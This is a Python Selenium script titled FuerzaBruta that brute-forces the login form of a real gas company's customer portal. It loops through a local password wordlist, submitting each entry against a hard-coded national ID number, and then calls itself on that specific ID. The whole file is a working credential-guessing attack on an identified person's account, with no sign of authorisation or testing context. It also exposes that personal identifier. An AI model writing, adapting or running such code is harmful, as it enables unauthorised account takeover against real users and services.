from os import link
from bs4 import BeautifulSoup
from bs4.element import SoupStrainer
import requests
import pandas 
import re
from selenium.webdriver.common.keys import Keys
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
import time
import csv
from datetime import date
import json
from selenium.webdriver.support.ui import Select

options= webdriver.ChromeOptions()
#options.add_argument('--headless')
#options.add_argument('--disable-gpu')
options.add_argument('start-maximized')
options.add_argument('--disable-extensions')

#driver_path='C:\\Users\\brian\\OneDrive\\Escritorio\\chromedriver.exe'
driver_path='/Users/brianignaciocastrofarias/Desktop/OneDrive/Escritorio/Trabajo/chromedriver'
driver=webdriver.Chrome(driver_path,chrome_options=options)


def FuerzaBruta(Rut):
    driver=webdriver.Chrome(driver_path,chrome_options=options)
    driver.get('https://sucursal.lipigas.cl/app_sucursal/frontend/usuarios/login')

    time.sleep(1)
    


    f = open ('/Users/brianignaciocastrofarias/Desktop/passwords.txt','r')
    mensaje = f.readlines()

    for i in mensaje:

        element = WebDriverWait(driver, 15).until(
                        EC.element_to_be_clickable((By.NAME,'rut')))\
                        .send_keys(Rut)


        element = WebDriverWait(driver, 15).until(
                            EC.element_to_be_clickable((By.ID,'clave')))\
                            .send_keys(i.replace('\n',''))
        try:

            element = WebDriverWait(driver, 15).until(
                                EC.element_to_be_clickable((By.XPATH,'/html/body/div[1]/main/div/div/div/div/div/div[2]/div/div[2]/div/form/div/button')))\
                                .click()
        except:
            
            element = WebDriverWait(driver, 15).until(
                                EC.element_to_be_clickable((By.XPATH,'/html/body/div[1]/main/div/div/div/div/div/div[3]/div/div[2]/div/form/div/button')))\
                                .click()
        
        time.sleep(10)

    driver.close()
    f.close()
    
FuerzaBruta('9467219-8')